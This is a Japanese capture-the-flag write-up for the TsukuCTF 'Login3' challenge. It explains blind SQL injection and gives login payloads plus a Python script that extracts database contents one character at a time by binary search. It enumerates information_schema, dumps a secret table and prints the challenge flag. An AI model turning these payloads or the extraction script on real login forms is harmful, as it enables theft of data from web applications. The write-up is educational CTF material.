---
title: Login3
description: Blind SQL injection
author: rikuta0811_dash
genre: Web
solver: 9
point: 472
---

# Login 3

> 筑紫くんは、これなら情報が流出するはずがないと自信満々です。果たして...
>
> https://tsukuctf.sechack365.com/problems/login3
>
> ※ この問題では/problems/login3 以下のみを用います。 他の問題/problems/<name>などと混同しないよう注意してください。

Login 1 ~ 3 がセットで SQL injection の問題になっています。
Login3 では、Blind SQL injection というテクニックが要求されます。

Login 1, 2 と同様に、Username を `' or 1=1 ; --` としてログインすると、ログインには成功しますが、ユーザー名等は表示されません。したがって、SQL injection に対して脆弱ではあるものの、injection した SQL 文の結果を確認することができません。
ここで、Username を `' or 1=2 ; --`とすると、ログインできませんでしたと表示されます。ということは、`1=1`や`1=2`の部分に bool 値をとる式を与えれば、その結果は取得できるということです。これを積み重ねて DB 内の情報を抜く手法は Blind SQL injection と呼ばれます。

information_schema からの情報取得等の実行したい query に対して、「query の実行結果の i 文字目は ascii コードで x より大きいか?」という bool 値をとる query を送信し、その bool 値を見ることで、2 分探索で query 結果を取得していきます。流石に手動で入力するのは面倒くさいので、コードを書くことにします。

```blind.py
def _execAnyQuery_core(query, pos, mid):
    url = "https://tsukuctf.sechack365.com/problems/login3/login.php"

    #queryの pos文字目がasciiコードでmidより大きければtrue
    params={
        "name":"' or ascii(substring(({0}),{1},1))>={2} ; -- ".format(query,pos,mid),
        "password":"a"
    }
    page = requests.post(url, data=params)

    return "ようこそ" in page.text

def _execAnyQuery(query, pos):
    """
    2分探索でqueryの実行結果のpos文字目を取得する。
    """
    low = 0
    high = 256
    while high-low>1:
        mid = (high+low)//2
        if _execAnyQuery_core(query, pos, mid):
            low = mid
        else:
            high = mid
    return low

def execAnyQuery(query):
    i = 1
    while True:
        char = int(_execAnyQuery(query, i))
        if char==0:
            return
        print(chr(char), end="")
        i+=1

execAnyQuery("select version()")
# >> 8.0.26
```

あとは、login2 と同様にテーブルを取得していきます。

```blind.py
for i in range(100):
    execAnyQuery("select distinct table_name from information_schema.columns limit 1 offset {0}".format(i))
    print()
# urtla_secret_tsukushiというtableがあることがわかる。

for i in range(10):
    execAnyQuery("select distinct column_name from information_schema.columns where table_name = 'urtla_secret_tsukushi' limit 1 offset {0}".format(i))
    print()

for i in range(33):
    execAnyQuery("select secret from urtla_secret_tsukushi limit 1 offset {0}".format(i))
# urtla_secret_tsukushiテーブルがidとsecretのカラムを持つことがわかる。

for i in range(33):
    execAnyQuery("select secret from urtla_secret_tsukushi limit 1 offset {0}".format(i))
#フラグが表示される。
```

フラグは

```txt
TsukuCTF{U_Are_Geni0us_T$UKUSH1}
```
